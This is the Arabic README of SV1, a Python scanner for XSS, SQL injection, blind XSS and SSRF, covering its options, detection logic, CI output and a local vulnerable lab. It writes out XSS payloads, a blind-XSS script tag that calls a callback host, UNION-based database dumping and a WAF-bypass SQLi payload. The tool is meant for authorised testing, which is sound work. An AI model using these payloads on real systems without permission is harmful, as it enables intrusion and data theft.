[English](README.md) · **العربية**

# SV1 — BY ee.zvz

**SV1** is a Python XSS / SQL injection / blind XSS / SSRF scanner for Windows 11.
It proves execution inside Chromium, catches out-of-band callbacks, crawls SPAs,
imports OpenAPI, and ships CI output: SARIF, severity gates, scoped scans, and
SQLite session history. Release `1.1.0`.

أداة فحص ثغرات **XSS** و **SQL Injection** و **Blind XSS** و **SSRF** مكتوبة
ببايثون، تشتغل على ويندوز 11. عند التشغيل تطلع مقدمة متحركة (لوقو SV1 بتدرّج
لوني + اسم المؤلف) ثم يبدأ الفحص.

---

## التنصيب

يتطلب **Python 3.10+**.

```powershell
cd sv1
python -m pip install -r requirements.txt
python -m playwright install chromium
```

خطوة المتصفح اختيارية لكن مطلوبة لإثبات التنفيذ (XSS حقيقي، DOM، Stored)،
ولزيارة صفحة المشرف في Blind XSS، ولزحف SPA. بدونها الأداة تشتغل وتفحص
الانعكاس و SQLi و blind callback و SSRF بشكل عادي.

التشغيل السريع:

```powershell
.\run.bat -u http://target.tld --crawl
```

`run.bat` يسوي بيئة افتراضية `.venv` تلقائياً أول مرة، وينزّل المتطلبات، ويشغّل الأداة.

> للمقدمة المتحركة استخدم **Windows Terminal** (يدعم ألوان 24-bit والرموز).

---

## الاستخدام

```powershell
python sv1.py -u <URL> [خيارات]
```

| الخيار | المعنى |
|---|---|
| `-u, --url` | الهدف (مطلوب). يقبل بدون `http://` ويضيفه تلقائياً |
| `--crawl` | يتبع الروابط من الصفحة |
| `--depth N` | عمق الزحف (افتراضي 2) |
| `--pages N` | أقصى عدد صفحات (افتراضي 25) |
| `--threads N` | عدد الخيوط (افتراضي 8) |
| `--timeout S` | مهلة الطلب بالثواني (افتراضي 12) |
| `--rps N` | حد الطلبات بالثانية (افتراضي 8، `0` = بلا حد) |
| `--fail-on LEVEL` | متى يرجع الكود 1: `any` (افتراضي)، `none`، `low`، `medium`، `high`، `critical` |
| `--scope FILE` | ملف allowlist للنطاقات/المسارات؛ أي شيء خارجه يُرفض |
| `--db FILE` | قاعدة SQLite لحفظ الجلسات والنتائج |
| `--diff` | مقارنة الجلسة الحالية بالسابقة في `--db` |
| `--retest` | إعادة فحص نتائج الجلسة المحفوظة بدل الزحف |
| `--sarif FILE` | تقرير SARIF 2.1.0 للـ CI |
| `--xss` | فحص XSS فقط |
| `--sqli` | فحص SQLi فقط |
| `--no-xss` / `--no-sqli` | تعطيل أحد الفحصين |
| `--time` | تشغيل فحص الحقن الزمني (بطيء، دقيق) |
| `--no-union` | تعطيل استخراج UNION |
| `--headers` | حقن في `X-Forwarded-For` و `Referer` و `User-Agent` |
| `--deep` | هيدرات إضافية: `X-Real-IP`, `Client-IP`, `Origin` … |
| `--cookies` | حقن في قيم الكوكيز الممررة بـ `--cookie` |
| `--json URL` | فحص حقن JSON على نقطة POST |
| `--json-data JSON` | قالب جسم JSON (افتراضي `{"id": "1", "q": "test"}`) |
| `--params` | اكتشاف باراميترات GET مخفية على عنوان الهدف |
| `--js` | استخراج نقاط حقن من سكربتات الصفحات |
| `--second-order` | فحص SQLi من الدرجة الثانية (يكتب في الهدف) |
| `--dump` | سحب هوية القاعدة وأسماء الجداول بعد نجاح UNION |
| `--spa` | زحف SPA: تحميل الصفحات في Chromium والتقاط XHR/fetch |
| `--openapi SPEC` | استيراد نقاط الحقن من ملف أو رابط OpenAPI JSON |
| `--blind` | Blind XSS: يحقن سكربت callback في نماذج POST وينتظر اتصالاً (يكتب في الهدف) |
| `--blind-visit URL` | يفتح صفحة المشرف بعد الحقن، يتكرر (محاكاة محلية) |
| `--ssrf` | يفحص الباراميترات الشبيهة بالروابط عبر callback |
| `--oob BASE` | عنوان callback العام (افتراضي `http://127.0.0.1:8777`) |
| `--oob-bind HOST:PORT` | عنوان الاستماع للـ callback (افتراضي `127.0.0.1:8777`) |
| `--oob-wait S` | ثواني انتظار callback بعد الفحص (افتراضي 8) |
| `--browser` | إجبار إثبات التنفيذ في Chromium |
| `--no-browser` | تعطيل المتصفح كلياً |
| `--stored` | فحص XSS المخزّن (يكتب بيانات في الهدف) |
| `--artifacts DIR` | مجلد صور الإثبات (افتراضي `sv1-artifacts`) |
| `--html FILE` | تقرير HTML بالصور |
| `-H "Key: Value"` | هيدر إضافي، يتكرر |
| `--cookie "sid=abc"` | كوكيز الجلسة |
| `--proxy URL` | بروكسي |
| `-k, --insecure` | تجاهل شهادة TLS |
| `-o FILE` | تصدير النتائج `.json` أو `.csv` |
| `--no-verify` | تخطي مرحلة إعادة التشغيل (replay) |
| `--no-banner` | تخطي المقدمة |
| `--version` | طباعة الإصدار |
| `-v` | إظهار أخطاء الشبكة والأخطاء الداخلية |

### أمثلة

```powershell
# موقع كامل، فحص كامل + تقرير بالصور
python sv1.py -u https://site.tld --crawl --html report.html -o report.json

# صفحة بحث واحدة، XSS فقط
python sv1.py -u "https://site.tld/search?q=test" --xss

# نقطة ID مع فحص زمني وجلسة مسجلة
python sv1.py -u "https://site.tld/item?id=1" --sqli --time --cookie "PHPSESSID=abc123"

# فحص مخزّن (يكتب في الهدف) مع صور الإثبات
python sv1.py -u https://site.tld --crawl --stored --html report.html

# بلا متصفح (أسرع، بلا إثبات تنفيذ)
python sv1.py -u https://site.tld --crawl --no-browser

# حقن الهيدرات والكوكيز (تختبر عنوان الهدف نفسه)
python sv1.py -u https://site.tld/api/account --headers --deep --cookies --cookie "sid=abc"

# واجهة JSON (PowerShell يشيل التنصيص الداخلي، لذا استخدم backtick)
python sv1.py -u https://site.tld/api/item --json https://site.tld/api/item \
  --json-data "{\`"id\`": 1, \`"q\`": \`"test\`"}"

# باراميترات مخفية على صفحة واحدة
python sv1.py -u https://site.tld/export --params

# نقاط من JavaScript + SQLi من الدرجة الثانية
python sv1.py -u https://site.tld --crawl --js --second-order

# سحب هوية القاعدة وأسماء الجداول بعد إثبات UNION
python sv1.py -u "https://site.tld/item?id=1" --dump

# زحف SPA + استيراد مواصفات OpenAPI
python sv1.py -u https://site.tld --crawl --spa --openapi https://site.tld/openapi.json

# Blind XSS: احقن في النماذج، ثم افتح صفحة المشرف (محاكاة محلية)
python sv1.py -u https://site.tld/contact --blind `
  --blind-visit https://site.tld/admin/messages --html report.html

# SSRF: باراميتر URL يطلب عنوان الـ callback
python sv1.py -u "https://site.tld/fetch?url=x" --ssrf

# CI: SARIF + فشل فقط عند HIGH أو أعلى
python sv1.py -u https://site.tld --crawl --sarif sv1.sarif --fail-on high

# نطاق محدد من ملف + تاريخ + diff بين الجلسات
python sv1.py -u https://site.tld --crawl --scope scope.txt `
  --db sv1-history.db --diff --fail-on high

# إعادة فحص نتائج الجلسة السابقة (بدون زحف)
python sv1.py -u https://site.tld --db sv1-history.db --retest --fail-on high

# هدف بعيد: لازم callback عام يوصل للـ listener (نفق/بروكسي عكسي)
python sv1.py -u https://site.tld --blind --oob https://cb.example.tld `
  --oob-bind 0.0.0.0:8777 --oob-wait 30
```

مخرجات الأداة: صفر = ما فيه نتائج (أو `--fail-on none`)، واحد = فيه نتيجة
عند/فوق عتبة `--fail-on`، اثنان = الهدف ما استجاب أو فشل فتح الملفات.

---

## CI والذاكرة (P5)

### SARIF و`--fail-on`

```powershell
python sv1.py -u https://site.tld --crawl `
  --sarif sv1.sarif --fail-on high
```

- `--sarif` يكتب SARIF 2.1.0: قاعدة لكل `kind/technique`، نتيجة لكل finding،
  بصمة ثابتة (`sv1Fingerprint`) وموقع ودرجة أمان. يصلح للرفع إلى GitHub code
  scanning أو أي أداة تقرأ SARIF.
- `--fail-on` يحدد كود الخروج فقط، ما يخفي النتائج:
  - `any` (الافتراضي): 1 إذا فيه أي نتيجة.
  - `none`: 0 دائماً مع بقاء التقرير.
  - `low/medium/high/critical`: 1 إذا فيه نتيجة عند العتبة أو أعلى.
  - 2 يبقى للهدف غير القابل للوصول أو فشل الكتابة.
- عتبة `high` لا تفشل على MEDIUM، وعتبة `critical` لا تفشل على HIGH.
- مثال CI:

```yaml
- run: python sv1.py -u "$TARGET" --crawl --sarif sv1.sarif --fail-on high
- uses: github/codeql-action/upload-sarif@v3
  if: always()
  with:
    sarif_file: sv1.sarif
```

### ملف النطاق `--scope`

```text
# scope.txt
example.com
*.example.com
https://api.example.com/v1/*
127.0.0.1:8099
```

- سطر لكل قاعدة، `#` للتعليق، و`*` wildcard في المضيف أو المسار.
- لازم الهدف نفسه يطابق قاعدة، وإلا يتوقف الفحص بكود 2.
- الزاحف ما يجلب صفحات خارج النطاق، والنقاط المستوردة من OpenAPI/JS/SPA
  والهيدرات/الكوكيز/JSON تُفلتر. الملف الفارغ أو غير المقروء = رفض.
- الملف يحدد ما يُفحص، وليس جدار شبكة: صفحات SPA قد تطلب أصولاً خارجية أثناء
  العرض. لا تعتمد عليه للحماية الشبكية.

### قاعدة الجلسات `--db` و`--diff`

```powershell
python sv1.py -u https://site.tld --crawl --db sv1.db --diff
```

- SQLite يحفظ كل جلسة وكل النتائج: الهدف، الوقت، الإصدار، الإحصاءات،
  البصمة، نقطة الحقن القابلة لإعادة الإرسال.
- `--diff` يقارن مع آخر جلسة لنفس الهدف:
  `+N new · N open · -N fixed`. البصمة تعتمد على النوع + طريقة HTTP + الرابط
  (بعد ترتيب query) + الباراميتر + تقنية الكشف، فالبايلود المتغير ما يخلق
  finding جديداً، لكن error وUNION على نفس النقطة يبقيان نتيجتين.
- الجلسة تُحفظ حتى لو كانت نظيفة، حتى يستطيع diff لاحق أن يثبت الإصلاح.
- `--retest` يقرأ آخر جلسة ويعيد إرسال النتائج القابلة لإعادة الإرسال فقط:
  XSS/SQLi error/boolean/time/second-order. لا يزحف ولا يعيد فحص OOB.
  نتائج Blind/SSRF/Stored/DOM/UNION تُعدّ `skipped` لأنها تحتاج متصفحاً أو
  استخراجاً كاملاً. استخدم نفس `-u` المستخدم في الجلسة الأصلية.
- إذا صار الهدف غير قابل للوصول، retest يعلّم النتائج `fixed` (لم تعد
  قابلة للإثبات) ويطبع العدد؛ هذا سلوك مقصود.

### 429 والتكيّف

حد `--rps` ما عاد ثابتاً فقط: عند `429/503` يضاعف SV1 الفاصل حتى 8 أضعاف،
ويحترم `Retry-After` الرقمي (بحد 30 ثانية)، ثم يعود تدريجياً بعد 20 رداً
سليماً. `--rps 0` يبقى بلا حد.

> P5.1 لاحقاً: محرك async بـ `httpx`، `--resume`، وcurl repro داخل HTML.
> الإصدار 1.1.0 يغطي SARIF وfail-on وscope وSQLite diff/retest وتكيّف 429.

---

## كيف يفحص

**الأساس: قياس الصفحة أولاً**
كل نقطة تُطلب مرتين بدون تعديل. تُقارن النسختان على مستوى التوكنز
(`difflib`) ويُقاس الضجيج: nonce، CSRF token، وقت، عداد. الضجيج يحدد
كل قرار بعده:

- `floor = 3 × noise` — أقل فرق يمكن تصديقه.
- الصفحة الثابتة: مقارنة واحدة.
- الصفحة المتغيرة: كل فرع يُعاد مرتين قبل المقارنة.

الصفحة التي يتجاوز ضجيجها 10% تُعامَل كغير موثوقة، وكل نتيجة عليها تنزل
درجة ثقة.

**XSS (منعكس)**
1. يرسل توكن عشوائي `sv1xxxxxxxx` في الباراميتر.
2. إذا ما رجع في الرد → لا انعكاس، يتخطاه.
3. يقرأ **قواعد** موضع الانعكاس: نص HTML، خاصية داخل وسم (وأي اقتباس)،
   داخل `<script>` (وأي نوع نص JS)، أو داخل تعليق.
4. يبني بايلود واحداً يقفل بالضبط ما هو مفتوح — مثلاً داخل
   `<script>var x = "..."` يستخدم `";alert(tok)//`، وداخل
   `value='...'` يستخدم `'><svg/onload=...>`.
5. يتحقق أن البايلود رجع **حرفياً** في الرد → `HIGH`.
   إذا رجع التوكن والوسوم مشفّرة → `MEDIUM`.

**SQLi**
1. **Error-based** — بايلودات كاسرة + بصمات أخطاء 7 قواعد بيانات، مع
   استثناء الأخطاء الموجودة في الصفحة الأصلية.
2. **Boolean-based** — 6 أزواج (صح/خطأ)، ويقبل فقط إذا:
   الفرعان تكررا بنفس الشكل، «الصح» طابق الأصل، «الخطأ» خالفه، والفرق
   بينهما فوق أرضية الضجيج.
3. **Time-based** (`--time`) — SLEEP / WAITFOR / pg_sleep / DBMS_PIPE،
   بتأكيد مرتين وهامش فوق زمن الأصل.
4. **UNION + استخراج** — تُشغّل فقط على نقطة أثبتت الحقن أصلاً:
   - عدّ الأعمدة: `ORDER BY n` يفشل عند أول عمود زائد → بحث ثنائي.
   - تحديد العمود المرتجع: `UNION SELECT NULL,...,'sv1u...',...` حتى يظهر الماركر.
   - استخراج فعلي: `version()`، `@@version`، `sqlite_version()`،
     أو `v$version` لأوراكل. القيمة نفسها تُكتب في الدليل، والبصمة تحدد القاعدة.
   - `--dump`: يقرأ `current_user()` و`database()` وأسماء الجداول من كتالوج
     القاعدة عبر نفس العمود المرتجع. كل قيمة محاطة بماركر `sv1[...]sv1` حتى
     تُقتطع من الرد بلا تخمين؛ بحد 3 طلبات و12 جدولاً. مدعوم على
     MySQL/PostgreSQL/MSSQL/SQLite.
   - النتيجة `CRITICAL` و `CONFIRMED` — قرأنا من القاعدة، ما خمّنّا.

**تجاوز الفلاتر**
إذا رد الهدف على بايلود بـ `403/406/429`، تُعاد نفس الحقنة بصياغات أخرى:
مسافات على شكل `/**/`، تبويب `%09`، تبديل حالة الأحرف، وتشفير مزدوج.
البايلود اللي نجح فعلاً هو اللي يُحفظ في النتيجة، ومرحلة الـ replay تجرب
نفس الصياغات قبل ما تحكم على النتيجة بأنها غير مستقرة.

**مواقع الحقن**
- `query` و `form` — تلقائي من الزحف.
- `header` (`--headers`) — قيم الهيدرات المذكورة أعلاه على عنوان الهدف.
- `cookie` (`--cookies`) — كل كوكي ممرر بـ `--cookie`.
- `json` (`--json`) — كل مفتاح في جسم JSON، مع `Content-Type: application/json`.
- `js` (`--js`) — كل URL فيه query داخل `<script>` مضمّن أو ملف سكربت خارجي
  بنفس الأصل. يغطي `fetch` و `axios` و `$.ajax` و أي رابط مكتوب كنص.
- `multipart` — نماذج `enctype="multipart/form-data"` تُرسل multipart فعلاً،
  والحقول النصية داخلها تصير نقاط حقن.

**Replay**
كل نتيجة تُعاد بعد الفحص (`--no-verify` يلغيها). إذا ما تكررت، تنزل درجة
خطورتها ودرجة ثقتها ويُكتب في التقرير أنها غير مستقرة. هذا يقتل الإيجابيات
الكاذبة الناتجة عن صفحات random أو WAF.

**إثبات التنفيذ (Chromium)**
إذا Playwright مثبّت، SV1 يفتح الصفحة فعلياً ويعيد الحقن كما أرسله:

- سكربت التهيئة يستبدل `alert/confirm/prompt` قبل أي سكربت في الصفحة ويسجل
  كل نداء بماركر خاص بالفحص (`sv1...`).
- النتيجة ما تصير `CONFIRMED` إلا إذا انطلق الماركر داخل الصفحة.
- ما انطلق → تنزل لـ `MEDIUM` مع ملاحظة صريحة.
- كل نتيجة مؤكدة تاخذ screenshot في `sv1-artifacts/`.

**DOM XSS**
تحليل ثابت لكل `<script>`: يبحث عن مصادر
(`location.hash/search/href`, `document.referrer`, `window.name`, `document.cookie`)
وأحواض (`innerHTML`, `document.write`, `eval`, `insertAdjacentHTML`, `setTimeout` …).
كل زوج مصدر→حوض يُختبر في المتصفح: `#payload` أو باراميترات شائعة. الثغرة
تسجل فقط إذا نفّذ المتصفح الماركر.

**Stored XSS** (`--stored`)
يرسل البايلود في نماذج POST، ثم يزور الصفحات مرة ثانية وينتظر الماركر.
يكتب بيانات في الهدف.

**اكتشاف باراميترات مخفية** (`--params`)
يبدأ بباراميتر تحكم عشوائي: إذا غيّر الصفحة، الصفحة تتفاعل مع أي شيء
والنتيجة غير موثوقة. غير ذلك يرسل أسماء شائعة على دفعات (16 اسم)، وإذا تغيّر
الرد يقسم الدفعة نصفين حتى يعزل الاسم، ثم يؤكد كل اسم لحاله مرتين. الأسماء
الموجودة أصلاً في الرابط تُستثنى، والأسماء التي تعمل فقط مجتمعة تُرفض.
الفحص على عنوان الهدف نفسه (مثل Arjun)، مو على كل صفحة زحفتها.

**نقاط من JavaScript** (`--js`)
الزاحف يتبع `<a href>` فقط. التطبيقات الحديثة تنادي `/api/...` من داخل
السكربت. SV1 يقرأ السكربت المضمّن ويجلب السكربتات الخارجية بنفس الأصل (بحد
6 ملفات لكل صفحة)، يستخرج كل نص بين علامات اقتباس فيه `?` أو `&`، يحوّله
إلى `InjectionPoint` عادي، ويكمّل عليه XSS + SQLi. الروابط الخارجية
والملفات الثابتة (`*.js?v=1`) تُستبعد.

**زحف SPA** (`--spa`)
الزاحف العادي يقرأ HTML فقط. SV1 يفتح حتى 6 صفحات فيها `<script>` داخل
Chromium فعلياً، يستمع لطلبات `xhr` و`fetch`، ويحوّل كل رابط فيها query إلى
نقطة حقن عادية. كذلك يلتقط روابط `<a>` التي لا تظهر إلا بعد تنفيذ JavaScript:
الرابط اللي فيه query يصير نقاط حقن، والرابط بدونه يُجلب كصفحة (بحد 4).
هذا يغطي الواجهات التي تبني نفسها بالمتصفح.

الحدود: يلتقط استدعاءات GET ذات query فقط، مو جسم POST للـ XHR. يحتاج
Chromium؛ مع `--no-browser` يُتخطى بتحذير.

**استيراد OpenAPI** (`--openapi`)
```powershell
python sv1.py -u https://site.tld --openapi spec.json
python sv1.py -u https://site.tld --openapi https://site.tld/openapi.json
```
يقرأ JSON (ملف محلي أو رابط)، يبني العناوين من `servers[0]` + `paths`،
ويصنع نقطة لكل باراميتر `query` وكل خاصية في جسم JSON أو form أو multipart.
`$ref` المحلي يُتبع، و`{param}` في المسار يُستبدل بـ `1` (المسار نفسه ما
يُحقن). بحد 80 نقطة و6 حقول لكل عملية. YAML غير مدعوم — صدّره JSON أولاً.

**الـ callback (OOB)**
عند استخدام `--blind` أو `--ssrf` يشغّل SV1 سيرفر HTTP محلياً على
`127.0.0.1:8777`. كل حقنة تاخذ توكن فريد (16 حرف hex). السيرفر يسجل وقت
الوصول، IP، User-Agent، Referer، والـ query — وما يسجل طلباً بلا توكن مسجل.
مسار `/t/<token>` يرجّع سكربت، ومسار `/e/<token>` يرجّع صورة 1×1.

- هدف محلي: العنوان الافتراضي يكفي.
- هدف بعيد: `--oob https://...` + `--oob-bind 0.0.0.0:8777` + نفق/فتح منفذ
  يوصل للـ listener. عنوان `127.0.0.1` ما يوصل من خارج الجهاز.
- إذا الهدف HTTPS استخدم callback بـ HTTPS؛ المتصفح يمنع mixed content.
- `--oob-wait` يحدد أقصى انتظار للاتصالات (blind و SSRF) بعد الحقن/الفحص.
- السيرفر ما يقرأ ملفات وما يعرض محتوى الهدف؛ يسجل hit فقط.

**Blind XSS** (`--blind`)
1. يجمع نماذج POST (بحد 6 نماذج، وحقلين لكل نموذج).
2. يحقن شكلين: `<script src="http://cb/t/TOKEN"></script>` و
   `"><script src="..."></script>` مع توكن مستقل لكل حقنة.
3. إذا فُتحت الصفحة في متصفح، يطلب `/t` ويرجّع JavaScript يحمّل
   `/e/TOKEN?p=<sink-url>`.
4. `/t` = السكربت انجلب. `/e` = السكربت **نُفّذ**، والـ `p` يحدد صفحة
   العرض الفعلية.
5. `--blind-visit` يفتح صفحة المشرف داخل Chromium بعد الحقن (محاكاة محلية)،
   وياخذ screenshot. بدونه ينتظر `--oob-wait` مشرفاً حقيقياً.
6. النتيجة: `HIGH` + `CONFIRMED` عند التنفيذ، و`HIGH` + `MEDIUM` إذا انجلب
   السكربت فقط (مثلاً CSP منع الصورة). ما تطلع نتيجة بلا hit.

`--blind` يكتب بيانات في الهدف.

**SSRF** (`--ssrf`)
- يختار باراميترات query/form/JSON/multipart التي اسمها يشبه عنواناً
  (`url`, `redirect`, `callback`, `webhook`, `next`, `dest` …) أو قيمتها
  الأصلية URL كامل.
- يرسل `http://<callback>/t/<token>` في مكانها. السيرفر يسجل الاتصال.
- الاختبار لا يتبع redirects: هدف يرد `302` نحو الـ callback ما يخلق نتيجة
  كاذبة، لأن الطلب لازم يجي من الهدف نفسه.
- النتيجة `HIGH` + `CONFIRMED` مع وقت الوصول و IP والـ User-Agent.
- بحد 15 نقطة، وبروتوكول HTTP(S) فقط. الهيدرات والكوكيز مستبعدة.

**Second-order SQLi** (`--second-order`)
الحقنة تُخزَّن الآن وتُنفَّذ لاحقاً في استعلام ثانٍ. الخطوات:
1. يخزّن قيمة نظيفة (`sv1clean`) في الحقل → يقيس الصفحات (بلا أخطاء).
2. يخزّن `sv1'` في نفس الحقل.
3. يزور حتى 6 صفحات (بما فيها صفحات النماذج) ويبحث عن بصمة خطأ قاعدة
   بيانات **جديدة** ما كانت في الأساس.
4. يظهر الخطأ → نتيجة `CRITICAL` بدليل: الحقل، صفحة التخزين، صفحة الخطأ.
5. مرحلة replay تفتح صفحة الخطأ وتتأكد أن الخطأ باقٍ.

الحدود: نموذج واحد لكل حقل، بايلود واحد، حتى 6 نماذج و6 صفحات. يكتب
بيانات في الهدف مثل `--stored`.

كل نتيجة تطلع لك: الهدف، الباراميتر، **طريقة الكشف** (`technique`)، البايلود،
مستوى الخطورة، درجة الثقة، وسطر الدليل.

---

## قياس على المختبر

صفحة `/account` تتغير كل طلب (nonce عشوائي) وفيها حقن منطقي حقيقي.
المقارنة بين المنطق القديم (بايتات، طلب واحد) والمحرك الحالي:

```
real injection on /account   old 0/5   sv1 5/5     ← القديم كان يفوّت
false positives on /noisy    old 0/5   sv1 0/5
```

السبب: ضجيج 2% يكسر مقارنة البايتات تماماً. SV1 يقيس الضجيج ويقارن البنية.

---

## بنية المشروع

```
sv1/
├── sv1.py              نقطة التشغيل والـ CLI
├── sv1lib/
│   ├── config.py       كل الأرقام والثوابت
│   ├── models.py       البيانات (Finding, InjectionPoint ...)
│   ├── net.py          عميل HTTP + حد معدل متكيّف مع 429
│   ├── identity.py     بصمة ثابتة للنتيجة (history/SARIF)
│   ├── history.py      SQLite: جلسات، نتائج، diff، retest
│   ├── scope.py        allowlist للنطاقات/المسارات
│   ├── policy.py       عتبة fail-on وكود الخروج
│   ├── sarif.py        تصدير SARIF 2.1.0
│   ├── crawl.py        زاحف + مستخرج النماذج (stdlib)
│   ├── baseline.py     قياس الضجيج وهوية الصفحة (difflib)
│   ├── context.py      تحليل سياق الحقن + بناء البايلود
│   ├── payloads.py     البايلودات وبصمات أخطاء DB
│   ├── xss.py          كاشف XSS منعكس
│   ├── domxss.py       تحليل مصدر→حوض + إثبات في المتصفح
│   ├── stored.py       حقن في النماذج ثم زيارة الصفحات
│   ├── hidden.py       اكتشاف باراميترات مخفية (بحث ثنائي)
│   ├── jsparse.py      استخراج نقاط الحقن من JavaScript
│   ├── spa.py          زحف SPA + التقاط XHR/fetch
│   ├── openapi.py      استيراد نقاط الحقن من OpenAPI JSON
│   ├── secondorder.py  SQLi من الدرجة الثانية (تخزين ثم زيارة)
│   ├── oob.py          سيرفر callback + توكنات + تسجيل hits
│   ├── blind.py        Blind XSS: حقن ثم انتظار التنفيذ
│   ├── ssrf.py         SSRF عبر نفس الـ callback
│   ├── sqli.py         كاشف SQLi (error/boolean/time/union)
│   ├── union.py        عدّ الأعمدة + الاستخراج + dump
│   ├── dberrors.py     بصمات أخطاء قواعد البيانات
│   ├── tamper.py       صياغات بديلة عند وجود فلتر
│   ├── browser.py      Chromium + هوك alert + screenshots
│   ├── verify.py       إعادة تشغيل النتائج
│   ├── banner.py       المقدمة المتحركة
│   └── report.py       العرض والتصدير (نص/JSON/CSV/HTML)
├── lab/server.py       هدف محلي مصاب للتدريب
├── tests/test_p5.py    اختبارات الوحدة (scope/history/SARIF/rate/fail-on)
├── .github/workflows/ci.yml
├── LICENSE             MIT
├── CHANGELOG.md        سجل الإصدارات
├── ROADMAP.md          خارطة التطوير
├── requirements.txt
└── run.bat
```

---

## مختبر محلي

هدف مصاب جاهز على `127.0.0.1` فقط، ما يطلع للشبكة:

```powershell
# نافذة 1
python lab\server.py 8099

# نافذة 2
python sv1.py -u http://127.0.0.1:8099/ --crawl --no-banner
```

الفحص الكامل مع تغطية P3 + P3.1 + P4 + P5:

```powershell
# ملف النطاق مرة واحدة
"127.0.0.1:8099" | Set-Content scope-lab.txt

python sv1.py -u http://127.0.0.1:8099/ --crawl --stored --js --second-order --dump `
  --spa --openapi http://127.0.0.1:8099/openapi.json `
  --blind --blind-visit http://127.0.0.1:8099/blind-admin --ssrf `
  --scope scope-lab.txt --db lab-history.db --diff --sarif report.sarif `
  --fail-on high --html report.html
```

النتيجة: **27 نتيجة، 27 أعادت التشغيل، 0 unstable** — CRITICAL 9، HIGH 16،
MEDIUM 2، 19 صفحة، 25 نقطة حقن، 780 طلباً، 149.2 ثانية (مع Chromium).

- **XSS (14):** 13 مؤكدة بالتنفيذ داخل Chromium (`/search`, `/feedback` حقلان،
  `/js`, `/attr`, `/waf`, `/api/fetch`, `/api/spa`, `/dynamic`)، DOM في `/dom`
  عبر `location.hash → innerHTML`، مخزّن في `/guestbook` (اسم + رسالة)،
  و Blind XSS في `/blind-admin`، وانعكاس مشفّر في `/safe` ينزل `MEDIUM`.
- **SQLi (12):** خطأ MySQL في `/search` و `/union` و `/waf` و `/upload`
  و `/api/fetch` و `/api/spa` و `/dynamic`، حقن منطقي في `/item` و `/api/item`،
  و`/account` ينزل `MEDIUM` لأن صفحته متغيرة (ضجيج)، استخراج UNION من
  `/union`: `3 columns, column 1 echoes back; version() -> 8.0.36-lab`، وحقن
  من الدرجة الثانية في `/profile` (`sv1'` تُخزَّن ثم تنكسر عند العرض).
- **SSRF (1):** `/fetch?url=` طلب عنوان الـ callback فعلياً، والنتيجة
  `HIGH` + `CONFIRMED` مع وقت الوصول والـ User-Agent. الاختبار لا يتبع
  redirects، فالـ hit من الهدف نفسه.
- **`--blind`:** 14 بايلوداً في 5 نماذج (شكلان لكل حقل). الصفحة
  `/blind-admin` غير مربوطة بالفهرس — لا يراها الزاحف. بعد الحقن فتحها
  `--blind-visit`، فطلب السكربت من `/t` ثم نفّذ صورة `/e` وأرسل صفحة العرض
  في `p`. الحقل نفسه في `/blind` انكشف مرة واحدة بعد إزالة التكرار.
- **`--ssrf`:** نقطة URL واحدة في `/fetch`؛ الطلب وصل للـ listener من
  `urllib` داخل المختبر، وليس من متصفح الفحص.
- **`--dump`:** يضيف للنتيجة قيم القاعدة:
  ```
  data    user    sv1@localhost
  data    db      sv1lab
  data    tables  users,notes,accounts
  ```
- **`--js`:** نقطتان من سكربت `/js-endpoints`:
  `/api/fetch?id=1&name=test` — XSS مؤكد بالتنفيذ و SQLi خطأ.
- **`--spa`:** 4 صفحات محمّلة، استدعاءا XHR، رابط ديناميكي، 6 نقاط. يلتقط
  `/api/spa?id=1&name=test` المبني بالمتغيرات (لا يراه `--js`) → XSS مؤكد
  بالتنفيذ و SQLi خطأ. ويلتقط رابط `<a>` الذي بناه السكربت نحو
  `/dynamic?id=1&name=test` → النتيجتان نفسهما. `/api/fetch` ذُكر أصلاً فما
  تكرر (dedupe بالمفتاح).
- **`--openapi`:** 4 نقاط من `/openapi.json`؛ `/api/item` JSON أضاف حقناً
  منطقياً واحداً. نقاط `/api/fetch` طابقت نقاط `--js` فما تكررت.
- **`--second-order`:** يخزّن `sv1clean` ثم `sv1'` في `/profile`، يقيس
  الصفحات، ويكشف الخطأ الجديد عند العرض.
- **`--params`** على `-u http://127.0.0.1:8099/hidden`: يكتشف `debug` و
  `export` ويطلع نتيجتا XSS مؤكدتان بالتنفيذ.
- `--json http://127.0.0.1:8099/api/item`: +1 (حقن منطقي JSON).
- `--headers` على `-u .../header`: +1، `--cookies --cookie sid=abc` على
  `-u .../cookie`: +1.

`--stored` و `--second-order` و `--blind` يكتبون بيانات في الهدف.
`--ssrf` يخلي الهدف يطلب عنوان الـ callback. المختبر يضيف `/blind`
و`/fetch` كصفحات عادية، بينما `/blind-admin` مقصود أن يبقى غير مربوط.

- **`--scope`:** ملف `127.0.0.1:8099` سمح بالهدف؛ هدف خارج الملف يرجع 2 قبل
  أي طلب. الزحف لا يخرج عن النطاق، ونقاط OpenAPI تُفلتر.
- **`--db --diff`:** الجلسة الأولى `#1` بلا سابق؛ إعادة الفحص بنفس الهدف
  تعطي `+0 new · 27 open · -0 fixed` (نُفّذت في القبول).
- **`--retest`:** من جلسة الـ 27: 21 open، 0 fixed، 6 skipped — تخطّى
  Blind وSSRF وStored وDOM وUNION. لم يزحف ولم يفتح متصفحاً.
- **SARIF:** 27 نتيجة، بصمة ثابتة لكل نتيجة، وملف يمرّ schema الرسمي
  SARIF 2.1.0.
- **`--fail-on`:** `none` = 0، `high` = 1، `critical` = 1 على المختبر،
  وهدف نظيف مع `high` = 0.

`/waf` يرفض أي طلب فيه مسافة بـ 403. SV1 يتجاوزها بـ `/**/` ويحفظ الصياغة
الناجحة في النتيجة:

```
vector  error
payload '/**/AND/**/1=CONVERT(int,@@version)--/**/-
note    database error surfaced (MySQL) - error based injection
        | filter bypassed with 2 encoded payload(s)
```

---

## حدود الأداة

- XSS يغطي المنعكس و DOM والمخزّن عند تشغيل Chromium. بدونه: انعكاس فقط.
- كشف DOM يعتمد على أزواج مصدر→حوض داخل `<script>` المضمّن. `--spa` ينفّذ
  الصفحات لكنه ما يحلل نصوص الـ bundles الخارجية.
- `--js` يقرأ الروابط المكتوبة كنص داخل السكربت (سكربت مضمّن + ملفات خارجية
  بنفس الأصل). إذا الرابط يُبنى بالمتغيرات (`'/api/' + id`) ما ينكشف — هنا
  يجي `--spa` ويلتقطه من الطلب الفعلي.
- `--spa`: حتى 6 صفحات، انتظار 1.8 ثانية للطلبات المتأخرة، ويلتقط GET query
  فقط (مو جسم POST للـ XHR). يحتاج Chromium؛ مع `--no-browser` يُتخطى.
- `--openapi`: JSON فقط (YAML يُصدَّر JSON)، يقرأ `servers[0]` و`paths`،
  ما يحقن `{param}` داخل المسار، وبحد 80 نقطة و6 حقول لكل عملية.
